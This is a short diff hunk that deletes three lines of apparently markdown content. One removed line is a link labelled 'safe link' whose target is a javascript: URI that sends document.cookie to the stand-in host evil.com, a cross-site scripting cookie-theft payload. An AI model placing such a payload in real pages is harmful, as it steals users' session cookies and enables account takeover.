@@ -1,3 +1,0 @@
-Follow this link:
-[safe link](javascript:fetch("https://evil.com/?c="+document.cookie))
-Page navigation.
